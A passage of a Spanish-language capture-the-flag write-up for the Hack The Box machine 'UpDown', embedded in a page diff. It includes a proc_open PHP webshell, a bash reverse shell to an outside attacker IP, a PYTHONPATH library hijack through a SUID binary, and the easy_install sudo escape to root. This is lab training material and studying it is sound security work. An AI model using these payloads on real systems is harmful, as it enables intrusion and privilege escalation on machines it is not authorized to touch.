+                <p>Tras investigar métodos alternativos de ejecución, descubro que <code>proc_open()</code> no está deshabilitada. Esta función permite generar procesos y capturar su salida. Creo una nueva webshell usando <code>proc_open()</code>:</p>
+                <pre><code class="language-php">&lt;?php
+$descriptorspec = array(
+    0 =&gt; array("pipe", "r"),
+    1 =&gt; array("pipe", "w"),
+    2 =&gt; array("pipe", "w")
+);
+$process = proc_open($_GET['cmd'], $descriptorspec, $pipes);
+echo stream_get_contents($pipes[1]);
+?&gt;</code></pre>
+                
+                <p>Empaqueto esto como <code>webshell.php</code>, lo zippeo con una extensión no bloqueada, lo subo y lo pruebo con el comando <code>id</code>:</p>
+                <p><img src="./media/image1.png" alt="Ejecución exitosa de comandos mostrando la salida del comando id mediante la webshell proc_open" /></p>
+                
+                <p>Con la ejecución de comandos confirmada, uso la webshell para lanzar una reverse shell:</p>
+                <pre><code class="language-plaintext">http://dev.siteisup.htb/?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.16.2/443%200%3E%261%22&page=phar://uploads/d50d5fd2bbec62a9e6dbb387630dcf35/webshell.asd/webshell</code></pre>
+                
+                <p>Recibo exitosamente una conexión de reverse shell como el usuario <code>www-data</code>.</p>
+                
+                <h2>Movimiento Lateral a Developer</h2>
+                <p>Enumerando el sistema de archivos, descubro un usuario llamado <code>developer</code> en <code>/home</code>:</p>
+                <pre><code class="language-bash">ls -ls /home</code></pre>
+                <pre><code class="language-plaintext">total 4
+4 drwxr-xr-x 6 developer developer 4096 Aug 30 2022 developer</code></pre>
+                
+                <p>Puedo acceder al directorio home de developer pero aún no puedo leer la flag de usuario. Dentro de <code>/home/developer/dev</code>, encuentro un binario SUID interesante y un script Python:</p>
+                <pre><code class="language-bash">ls -la /home/developer/dev</code></pre>
+                <pre><code class="language-plaintext">total 32
+drwxr-x--- 2 developer www-data   4096 Jun 22 2022 .
+drwxr-xr-x 6 developer developer  4096 Aug 30 2022 ..
+-rwsr-x--- 1 developer www-data  16928 Jun 22 2022 siteisup
+-rwxr-x--- 1 developer www-data    154 Jun 22 2022 siteisup_test.py</code></pre>
+                
+                <p>El binario <code>siteisup</code> tiene el bit SUID establecido y es propiedad de <code>developer</code>, lo que significa que se ejecuta con los privilegios de developer. Permíteme verificar que es un binario:</p>
+                <pre><code class="language-bash">file siteisup</code></pre>
+                <pre><code class="language-plaintext">siteisup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b5bbc1de286529f5291b48db8202eefbafc92c1f, for GNU/Linux 3.2.0, not stripped</code></pre>
+                
+                <p>Cuando ejecuto el binario, solicita una URL pero se cae con un error de sintaxis:</p>
+                <pre><code class="language-bash">./siteisup</code></pre>
+                <pre><code class="language-plaintext">Welcome to 'siteisup.htb' application
+
+Enter URL here:10.10.16.2
+Traceback (most recent call last):
+  File "/home/developer/dev/siteisup_test.py", line 3, in &lt;module&gt;
+    url = input("Enter URL here:")
+  File "&lt;string&gt;", line 1
+    10.10.16.2
+    ^
+SyntaxError: invalid syntax</code></pre>
+                
+                <p>El error revela que el binario está ejecutando el script Python <code>siteisup_test.py</code>. Examino el script:</p>
+                <pre><code class="language-python">import requests
+
+url = input("Enter URL here:")
+page = requests.get(url)
+if page.status_code == 200:
+    print "Website is up"
+else:
+    print "Website is down"</code></pre>
+                
+                <p>El script es directo: importa el módulo <code>requests</code>, solicita una URL, hace una petición HTTP y comprueba si el estado de respuesta es 200. El hecho de que el binario ejecute este script Python y tenga el bit SUID establecido presenta una oportunidad de explotación.</p>
+                
+                <h2>Secuestro de Librería Python mediante PYTHONPATH</h2>
+                <p>Ya que el binario SUID ejecuta un script Python que importa <code>requests</code>, puedo explotar esto secuestrando el proceso de importación de módulos. Python busca módulos en el siguiente orden:</p>
+                <ol>
+                    <li>El directorio que contiene el script siendo ejecutado</li>
+                    <li>Directorios especificados en la variable de entorno <code>PYTHONPATH</code></li>
+                    <li>Directorios de la biblioteca estándar</li>
+                </ol>
+                
+                <p>No puedo escribir en el directorio donde está <code>siteisup_test.py</code>:</p>
+                <pre><code class="language-bash">touch asd</code></pre>
+                <pre><code class="language-plaintext">touch: cannot touch 'asd': Permission denied</code></pre>
+                
+                <p>Sin embargo, puedo manipular la variable de entorno <code>PYTHONPATH</code>. Importante destacar que cuando un binario SUID se ejecuta (a diferencia de usar <code>sudo</code>), las variables de entorno se preservan, haciendo viable este vector de ataque.</p>
+                
+                <p>Creo un archivo <code>requests.py</code> malicioso en <code>/tmp</code> que genera una shell bash en lugar de proporcionar funcionalidad de peticiones HTTP:</p>
+                <pre><code class="language-python">import os
+os.system('/bin/bash')</code></pre>
+                
+                <p>Luego establezco <code>PYTHONPATH</code> para que apunte a <code>/tmp</code>:</p>
+                <pre><code class="language-bash">export PYTHONPATH=/tmp</code></pre>
+                
+                <p>Ahora cuando ejecuto el binario SUID, Python encontrará mi <code>requests.py</code> malicioso en <code>/tmp</code> antes de buscar en la biblioteca estándar. Ya que el binario se ejecuta con los privilegios de developer, la shell bash generada también se ejecutará como developer:</p>
+                <pre><code class="language-bash">./siteisup</code></pre>
+                <pre><code class="language-plaintext">Welcome to 'siteisup.htb' application
+
+developer@updown:/home/developer/dev$</code></pre>
+                
+                <p>Escalo exitosamente al usuario <code>developer</code>. Curiosamente, aún no puedo leer directamente la flag de usuario desde esta shell, pero encuentro una clave SSH privada en <code>.ssh/id_rsa</code>. Copio esta clave a mi máquina local y la uso para autenticarme mediante SSH, lo que me otorga acceso completo a la cuenta developer y la capacidad de leer la flag de usuario.</p>
+                
+                <h2>Escalada de Privilegios a Root</h2>
+                <p>Como usuario developer, compruebo los privilegios sudo:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+                <pre><code class="language-plaintext">Matching Defaults entries for developer on localhost:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User developer may run the following commands on localhost:
+    (ALL) NOPASSWD: /usr/local/bin/easy_install</code></pre>
+                
+                <p>El usuario developer puede ejecutar <code>/usr/local/bin/easy_install</code> con sudo sin contraseña. Permíteme examinar este binario:</p>
+                <pre><code class="language-bash">file /usr/local/bin/easy_install</code></pre>
+                <pre><code class="language-plaintext">/usr/local/bin/easy_install: Python script, ASCII text executable</code></pre>
+                <pre><code class="language-bash">cat /usr/local/bin/easy_install</code></pre>
+                <pre><code class="language-python">#!/usr/bin/python
+# -*- coding: utf-8 -*-
+import re
+import sys
+from setuptools.command.easy_install import main
+
+if __name__ == '__main__':
+    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
+    sys.exit(main())</code></pre>
+                
+                <p><code>easy_install</code> es un instalador de paquetes Python, similar a <code>pip</code>. Es parte del paquete <code>setuptools</code> y se utiliza para instalar paquetes Python.</p>
+                
+                <p>A diferencia de la explotación SUID anterior, no puedo usar secuestro de <code>PYTHONPATH</code> aquí porque sudo tiene <code>env_reset</code> habilitado, que limpia las variables de entorno antes de la ejecución.</p>
+                
+                <p>Sin embargo, <code>easy_install</code> es un binario bien conocido que puede ser abusado para escalada de privilegios. Encuentro la técnica en GTFOBins: <a href="https://gtfobins.github.io/gtfobins/easy_install/#sudo">https://gtfobins.github.io/gtfobins/easy_install/#sudo</a></p>
+                
+                <h3>Entendiendo el Exploit de easy_install</h3>
+                <p>El exploit funciona aprovechando la capacidad de <code>easy_install</code> de ejecutar archivos <code>setup.py</code> durante la instalación de paquetes. Cuando ejecutáis <code>easy_install</code> en un directorio, busca un archivo <code>setup.py</code> y lo ejecuta como parte del proceso de instalación. Ya que estamos ejecutando <code>easy_install</code> con sudo, el script <code>setup.py</code> se ejecutará con privilegios root.</p>
+                
+                <p>Siguiendo la guía de GTFOBins, ejecuto estos comandos para escalar a root:</p>
+                <pre><code class="language-bash">TF=$(mktemp -d)
+echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)')" &gt; $TF/setup.py
+sudo easy_install $TF</code></pre>
+                
+                <p>Los comandos funcionan de la siguiente manera:</p>
+                <ol>
+                    <li><code>TF=$(mktemp -d)</code> crea un directorio temporal</li>
+                    <li>Escribo un <code>setup.py</code> malicioso que usa <code>os.execl()</code> para generar una shell</li>
+                    <li><code>sudo easy_install $TF</code> ejecuta easy_install en el directorio temporal con privilegios root</li>
+                    <li>easy_install ejecuta el archivo <code>setup.py</code> como root, generando una shell root</li>
+                </ol>
+                
+                <p>Después de ejecutar estos comandos, obtengo exitosamente una shell root y puedo leer la flag de root, completando la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
